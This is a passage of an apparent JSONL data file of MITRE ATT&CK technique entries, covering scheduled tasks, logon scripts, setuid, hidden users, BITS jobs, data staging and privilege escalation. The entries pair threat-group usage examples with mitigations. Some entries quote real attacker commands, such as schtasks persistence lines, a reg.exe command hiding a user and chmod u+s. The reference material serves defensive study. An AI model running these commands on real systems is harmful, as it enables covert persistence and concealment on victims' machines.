scheduled task on a system.", "menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.", "MCMD can use scheduled tasks for persistence.", "JHUHUGIT has registered itself as a scheduled task to run each time the current user logs in.", "Crutch has the ability to persist using scheduled tasks.", "GravityRAT creates a scheduled task to ensure it is re-executed everyday.", "Revenge RAT schedules tasks to run malicious scripts at different intervals.", "Okrum's installer can attempt to achieve persistence by creating a scheduled task.", "Stuxnet schedules a network job to execute two minutes after host infection.", "IcedID has created a scheduled task that executes every hour to establish persistence.", "Bazar can create a scheduled task for persistence.", "SharpStage has a persistence component to write a scheduled task for the payload. ", "GRIFFON has used <code>sctasks</code> for persistence. ", "Wizard Spider has used scheduled tasks establish persistence for TrickBot and other malware.", "SoreFang can gain persistence through use of scheduled tasks.", "Emotet has maintained persistence through a scheduled task. ", "OopsIE creates a scheduled task to run itself every three minutes.", "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. ", "Gazer can establish persistence by creating a scheduled task.", "EvilBunny has executed commands via scheduled tasks.", "Fox Kitten has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.", "ComRAT has used a scheduled task to launch its PowerShell loader.", "A Patchwork file stealer can run a TaskScheduler DLL to add persistence.", "APT39 has created scheduled tasks for persistence.", "JSS Loader has the ability to launch scheduled tasks to establish persistence.", "CostaRicto has used scheduled tasks to download backdoor tools.", "Stealth Falcon malware creates a scheduled task entitled “IE Web Cache” to execute a malicious file hourly.", "Dragonfly 2.0 used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.", "Bad Rabbit’s <code>infpub.dat</code> file creates a scheduled task to launch a malicious executable.", "Ramsay can schedule tasks via the Windows COM API to maintain persistence.\t", "Lucifer has established persistence by creating the following scheduled task <code>schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F</code>.", "Smoke Loader launches a scheduled task.", "Attor's installer plugin can schedule a new task that loads the dispatcher on boot/logon.", "Maze has created scheduled tasks using name variants such as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\", to launch Maze at a specific time.", "Anchor can create a scheduled task for persistence.", "Carbon creates several tasks for later execution to continue persistence on the victim’s machine.", "FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.", "GrimAgent has the ability to set persistence using the Task Scheduler.", "APT33 has created a scheduled task to execute a .vbe file multiple times a day.", "Valak has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.", "QUADAGENT creates a scheduled task to maintain persistence on the victim’s machine.", "NETWIRE can create a scheduled task to establish persistence.", "GoldMax has used scheduled tasks to maintain persistence.", "yty establishes persistence by creating a scheduled task with the command <code>SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“</code>.", "BONDUPDATER persists using a scheduled task that executes every minute.", "Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script <code>schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st</code> and to maintain persistence.", "PowerSploit's <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via a Scheduled Task/Job.", "Agent Tesla  has achieved persistence via scheduled tasks. ", "Lokibot embedded the commands <code>schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I</code> inside a batch script. ", "QuasarRAT contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.", "Naikon has used schtasks.exe for lateral movement in compromised networks.", "Matryoshka can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\".", "Machete has created scheduled tasks to maintain Machete's persistence.", "MuddyWater has used scheduled tasks to establish persistence.", "Helminth has used a scheduled task for persistence.", "Shamoon copies an executable payload to the target system by using SMB/Windows Admin Shares and then scheduling an unnamed task to execute the malware.", "Higaisa dropped and added <code>officeupdate.exe</code> to scheduled tasks.", "One persistence mechanism used by CozyCar is to register itself as a scheduled task.", "Rancor launched a scheduled task to gain persistence using the <code>schtasks /create /sc</code> command.", "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl. The setting can be configured through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. ", "FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS.", "The different components of Machete are executed by Windows Task Scheduler.", "BackConfig has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.", "RemoteCMD can execute commands remotely by creating a new schedule task on the remote system", "HotCroissant has attempted to install a scheduled task named “Java Maintenance64” on startup to establish persistence.", "Remexi utilizes scheduled tasks as a persistence mechanism.", "schtasks is used to schedule tasks on a Windows system to run at a specific date and time.", "APT37 has created scheduled tasks to run malicious scripts on a compromised host.", "Frankenstein has established persistence through a scheduled task using the command: <code> /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR </code>, named \"WinUpdate\".\t", "InvisiMole has used scheduled tasks named <code>MSST</code> and <code>\\Microsoft\\Windows\\Autochk\\Scheduled</code> to establish persistence.", "RainyDay can use scheduled tasks to achieve persistence.", "BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement.", "zwShell has used SchTasks for execution.", "Molerats has created scheduled tasks to persistently run VBScripts.", "Blue Mockingbird has used Windows Scheduled Tasks to establish persistence on local and remote hosts.", "Zebrocy has a command to create a scheduled task for persistence.", "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.", "RTM tries to add a scheduled task to establish persistence.", "Sibot has been executed via a scheduled task.", "SQLRat has created scheduled tasks in <code>%appdata%\\Roaming\\Microsoft\\Templates\\</code>.", "APT29 used <code>scheduler</code> and <code>schtasks</code> to create new tasks on remote hosts as part of lateral movement. They have manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted during the 2020 SolarWinds intrusion. They previously used named and hijacked scheduled tasks to also establish persistence.", "Pteranodon schedules tasks to invoke its components in order to establish persistence.", "Cobalt Group has created Windows tasks to establish persistence.", "AppleJeus has created a scheduled SYSTEM task that runs when a user logs in.", "IronNetInjector has used a task XML file named <code>mssch.xml</code> to run an IronPython script when a user logs in or when specific system events are created.", "Goopy has the ability to maintain persistence by creating scheduled tasks set to run every hour.\t", "An APT3 downloader creates persistence by creating the following scheduled task: <code>schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"</code>.", "TEMP.Veles has used scheduled task XML triggers.", "ServHelper contains modules that will use schtasks to carry out malicious operations.", "APT-C-36 has used a macro function to set scheduled tasks, disguised as those used by Google.", "Ryuk can remotely create a scheduled task to execute itself on a system.", "OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines.", "APT32 has used scheduled tasks to persist on victim systems.", "ISMInjector creates scheduled tasks to establish persistence."], "is_subtechnique": true}
{"text": " Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts) Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.", "idx": "https://attack.mitre.org/techniques/T1037/001", "title": "Logon Script (Windows)", "entity": "Logon Script (Windows)", "entity_type": "techniques", "entity_context": ["JHUHUGIT has registered a Windows shell script under the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code> to establish persistence.", "Zebrocy performs persistence with a logon script via adding to the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code>.", "Cobalt Group has added persistence by registering the file name for the next stage malware under <code>HKCU\\Environment\\UserInitMprLogonScript</code>.", "An APT28 loader Trojan adds the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code> to establish persistence.", "Attor's dispatcher can establish persistence via adding a Registry key with a logon script <code>HKEY_CURRENT_USER\\Environment \"UserInitMprLogonScript\" </code>.", "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for logon scripts that may lead to persistence.", "KGH_SPY has the ability to set the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key to execute logon scripts."], "is_subtechnique": true}
{"text": " An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware).", "idx": "https://attack.mitre.org/techniques/T1548/001", "title": "Setuid and Setgid", "entity": "Setuid and Setgid", "entity_type": "techniques", "entity_context": ["Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system.", "Keydnap adds the setuid flag to a binary so it can easily elevate in the future.", "Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality."], "is_subtechnique": true}
{"text": " Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA) Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.", "idx": "https://attack.mitre.org/techniques/T1550", "title": "Use Alternate Authentication Material", "entity": "Use Alternate Authentication Material", "entity_type": "techniques", "entity_context": ["Enforce the principle of least-privilege. Do not allow a domain user to be in the local administrator group on multiple systems.", "APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services.", "Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems."], "is_subtechnique": false}
{"text": " An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations. In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.", "idx": "https://attack.mitre.org/techniques/T1562/006", "title": "Indicator Blocking", "entity": "Indicator Blocking", "entity_type": "techniques", "entity_context": ["Consider automatically relaunching forwarding mechanisms at recurring intervals (ex: temporal, on-logon, etc.) as well as applying appropriate change management to firewall rules and other related system configurations.", "Ebury can hook logging functions so that nothing from the backdoor gets sent to the logging facility.\t", "Ensure event tracers/forwarders , firewall policies, and other associated mechanisms are secured with appropriate permissions and access controls.", "Waterbear can hook the <code>ZwOpenProcess</code> and <code>GetExtendedTcpTable</code> APIs called by the process of a security product to hide PIDs and TCP records from detection.", "Ensure event tracers/forwarders , firewall policies, and other associated mechanisms are secured with appropriate permissions and access controls and cannot be manipulated by user accounts."], "is_subtechnique": true}
{"text": " Adversaries may use hidden users to mask the presence of user accounts they create or modify. Normal users may want to hide users when there are many users accounts on a given system or want to keep an account hidden from the other users on the system. In macOS, every user account has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. When using the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID under 500 (ex: <code>sudo dscl . -create /Users/username UniqueID 401</code>) and enabling this property (setting it to Yes), an adversary can conceal user accounts. (Citation: Cybereason OSX Pirrit) In Windows, adversaries may hide user accounts via settings in the Registry. For example, an adversary may add a value to the Windows Registry (via [Reg](https://attack.mitre.org/software/S0075) or other means) that will hide the user “test” from the Windows login screen: <code>reg.exe ADD 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccountsUserList' /v test /t REG_DWORD /d 0 /f</code>.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)", "idx": "https://attack.mitre.org/techniques/T1564/002", "title": "Hidden Users", "entity": "Hidden Users", "entity_type": "techniques", "entity_context": ["If the computer is domain joined, then group policy can help restrict the ability to create or hide users. Similarly, preventing the modification of the <code>/Library/Preferences/com.apple.loginwindow</code> <code>Hide500Users</code> value will force all users to be visible.", "Dragonfly 2.0 modified the Registry to hide create user accounts. ", "SMOKEDHAM has modified the Registry to hide created user accounts from the Windows logon screen. "], "is_subtechnique": true}
{"text": " Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017) Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017) Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting", "idx": "https://attack.mitre.org/techniques/T1553/003", "title": "SIP and Trust Provider Hijacking", "entity": "SIP and Trust Provider Hijacking", "entity_type": "techniques", "entity_context": ["Enable application control solutions such as AppLocker and/or Device Guard to block the loading of malicious SIP DLLs.", "Ensure proper permissions are set for Registry hives to prevent users from modifying keys related to SIP and trust provider components. Components may still be able to be hijacked to suitable functions already present on disk if malicious modifications to Registry keys are not prevented. ", "Restrict storage and execution of SIP DLLs to protected directories, such as C:\\\\Windows, rather than user directories."], "is_subtechnique": true}
{"text": " Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user. WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)", "idx": "https://attack.mitre.org/techniques/T1021/006", "title": "Windows Remote Management", "entity": "Windows Remote Management", "entity_type": "techniques", "entity_context": ["If the service is necessary, lock down critical enclaves with separate WinRM infrastructure and follow WinRM best practices on use of host firewalls to restrict WinRM access to allow communication only to/from specific devices.", "APT29 has used WinRM via PowerShell to execute command and payloads on remote hosts.", "If the service is necessary, lock down critical enclaves with separate WinRM accounts and permissions.", "Wizard Spider has used Window Remote Management to move laterally through a victim network.", "Threat Group-3390 has used WinRM to enable remote execution.", "Chimera has used WinRM for lateral movement.", "Disable the WinRM service.", "Cobalt Strike can use <code>WinRM</code> to execute a payload on a remote host."], "is_subtechnique": true}
{"text": " Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.", "idx": "https://attack.mitre.org/techniques/T1074/001", "title": "Local Data Staging", "entity": "Local Data Staging", "entity_type": "techniques", "entity_context": ["Ramsay can stage data prior to exfiltration in <code>%APPDATA%\\Microsoft\\UserSetting</code> and <code>%APPDATA%\\Microsoft\\UserSetting\\MediaCache</code>.\t", "Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.", "RainyDay can use a file exfiltration tool to copy files to <code>C:\\ProgramData\\Adobe\\temp</code> prior to exfiltration.", "Turian can store copied files in a specific directory prior to exfiltration.", "Mustang Panda has stored collected credential files in <code>c:\\windows\\temp</code> prior to exfiltration. Mustang Panda has also stored documents for exfiltration in a hidden folder on USB drives.", "BADNEWS copies documents under 15MB found on the victim system to is the user's <code>%temp%\\SMB\\</code> folder. It also copies files from USB devices to a predefined directory.", "Astaroth collects data in a plaintext file named r1.log before exfiltration. ", "TEMP.Veles has created staging folders in directories that were infrequently used by legitimate users or processes.", "Attor has staged collected data in a central upload directory prior to exfiltration.", "FIN5 scripts save memory dump data into a specific directory on hosts in the victim environment.", "MarkiRAT can store collected data locally in a created .nfo file.", "QakBot has stored stolen emails and other data into new folders prior to exfiltration.", "SombRAT can store harvested data in a custom database under the %TEMP% directory.", "NETWIRE has the ability to write collected data to a file created in the <code>./LOGS</code> directory.", "MoonWind saves information from its keylogging routine as a .zip file in the present working directory.", "NOKKI can collect data from the victim and stage it in <code>LOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp</code>.", "Leviathan has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.", "Ursnif has used tmp files to stage gathered information.", "ADVSTORESHELL stores output from command execution in a .dat file in the %TEMP% directory.", "InvisiMole determines a working directory where it stores all the gathered data about the compromised machine.", "Carbon creates a base directory that contains the files and folders that are collected.", "ECCENTRICBANDWAGON has stored keystrokes and screenshots within the <code>%temp%\\GoogleChrome</code>, <code>%temp%\\Downloads</code>, and <code>%temp%\\TrendMicroUpdate</code> directories.", "menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.", "Dtrack can save collected data to disk, different file formats, and network shares.", "Pteranodon creates various subdirectories under <code>%Temp%\\reports\\%</code> and copies files to those subdirectories. It also creates a folder at <code>C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store</code> to store screenshot JPEG files.", "Chimera has staged stolen data locally on compromised hosts.", "DustySky created folders in temp directories to host collected files before exfiltration.", "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.", "AppleSeed can stage files in a central location prior to exfiltration.", "Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.", "GALLIUM compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.", "Helminth creates folders to store output from batch scripts prior to sending the information to its C2 server.", "Dyre has the ability to create files in a TEMP folder to act as a database to store information.", "ObliqueRAT can copy specific files, webcam captures, and screenshots to local directories.", "Honeybee adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.", "Threat Group-3390 has locally staged encrypted archives for later exfiltration efforts.", "Gold Dragon stores information gathered from the endpoint in a file named 1.hwp.", "Rover copies files from removable drives to <code>C:\\system</code>.", "PUNCHTRACK aggregates collected data in a tmp file.", "USBStealer collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.", "Dragonfly 2.0 created a directory named \"out\" in the user's %AppData% folder and copied files to it.", "BackdoorDiplomacy has copied files of interest to the main drive's recycle bin.", "Operation Wocao has staged archived files in a temporary directory prior to exfiltration.\t", "Catchamas stores the gathered data from the machine in .db files and .bmp files under four separate locations.", "FLASHFLOOD stages data it copies from the local system or removable drives in the \"%WINDIR%\\$NtUninstallKB885884$\\\" directory.", "MESSAGETAP stored targeted SMS messages that matched its target list in CSV files on the compromised system.", "Octopus has stored collected information in the Application Data directory on a compromised host.", "LightNeuron can store email data in files and directories specified in its configuration, such as <code>C:\\Windows\\ServiceProfiles\\NetworkService\\appdata\\Local\\Temp\\</code>.", "Elise creates a file in <code>AppData\\Local\\Microsoft\\Windows\\Explorer</code> and stores all harvested data in that file.", "BoxCaon has created a working folder for collected files that it sends to the C2 server. ", "Indrik Spider has stored collected date in a .tmp file.", "Zebrocy stores all collected information in a single file before exfiltration.", "Exaramel for Windows specifies a path to store files scheduled for exfiltration. ", "Machete stores files and logs in a folder on the local drive.", "APT28 has stored captured credential information in a file named pi.log.", "Sidewinder has collected stolen files in a temporary folder in preparation for exfiltration.", "Patchwork copied all targeted files to a directory called index that was eventually uploaded to the C&C server.", "Kimsuky has staged collected data files under <code>C:\\Program Files\\Common Files\\System\\Ole DB\\</code>.", "FrameworkPOS can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\\Windows\\.", "APT3 has been known to stage files for exfiltration in a single location.", "SPACESHIP identifies files with certain extensions and copies them to a directory in the user's profile.", "BadPatch stores collected data in log files before exfiltration.", "Crutch has staged stolen files in the <code>C:\\AMD\\Temp</code> directory.", "Kazuar stages command output and collected data in files before exfiltration.", "KGH_SPY can save collected system information to a file named \"info\" before exfiltration.", "Prikormka creates a directory, <code>%USERPROFILE%\\AppData\\Local\\SKC\\</code>, which is used to store collected log files.", "OopsIE stages the output from command execution and collected files in specific folders before exfiltration.", "NavRAT writes multiple outputs to a TMP file using the >> method.", "Trojan.Karagany can create directories to store plugin output and stage data for exfiltration.", "Data captured by RawPOS is placed in a temporary file under a directory named \"memdump\".", "PoisonIvy stages collected data in a text file.", "PUNCHBUGGY has saved information to a random temp file before exfil.", "APT39 has utilized tools to aggregate data prior to exfiltration."], "is_subtechnique": true}
{"text": " Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure. Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected. A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)", "idx": "https://attack.mitre.org/techniques/T1535", "title": "Unused/Unsupported Cloud Regions", "entity": "Unused/Unsupported Cloud Regions", "entity_type": "techniques", "entity_context": ["Cloud service providers may allow customers to deactivate unused regions."], "is_subtechnique": false}
{"text": " Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations. The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin) Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016) BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)", "idx": "https://attack.mitre.org/techniques/T1197", "title": "BITS Jobs", "entity": "BITS Jobs", "entity_type": "techniques", "entity_context": ["MarkiRAT can use BITS Utility to connect with the C2 server.", "\nConsider limiting access to the BITS interface to specific users or groups.", "\nConsider reducing the default BITS job lifetime in Group Policy or by editing the <code>JobInactivityTimeout</code> and <code>MaxDownloadTime</code> Registry values in <code> HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS</code>.", "Patchwork has used BITS jobs to download malicious payloads.", "BITSAdmin can be used to create BITS Jobs to launch a malicious process.", "A JPIN variant downloads the backdoor payload via the BITS service.", "APT41 used BITSAdmin to download and install payloads.", "ProLock can use BITS jobs to download its malicious payload.", "UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.", "Egregor has used BITSadmin to download and execute malicious DLLs.", "Bazar has been downloaded via Windows BITS functionality.", "Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic.", "Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin.", "Leviathan has used BITSAdmin to download additional tools.", "APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host."], "is_subtechnique": false}
{"text": " Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods. Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may", "idx": "https://attack.mitre.org/techniques/T1068", "title": "Exploitation for Privilege Escalation", "entity": "Exploitation for Privilege Escalation", "entity_type": "techniques", "entity_context": ["Cobalt Group has used exploits to increase their levels of rights and privileges.", "PLATINUM has leveraged a zero-day vulnerability to escalate privileges.", "FIN8 has exploited the CVE-2016-0167 local vulnerability.", "Stuxnet used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.", "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization.", "Carberp has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.", "Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.", "XCSSET has used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP.", "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. ", "InvisiMole has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.", "Threat Group-3390 has used CVE-2014-6324 to escalate privileges.", "Update software regularly by employing patch management for internal enterprise endpoints and servers.", "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility and may not work for software components targeted for privilege escalation.", "Hildegard has used the BOtB tool which exploits CVE-2019-5736. ", "FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.", "Tonto Team has exploited CVE-2019-0803 and MS16-032 to escalate privileges.", "Cobalt Strike can exploit vulnerabilities such as MS14-058.", "JHUHUGIT has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.", "CosmicDuke attempts to exploit privilege escalation 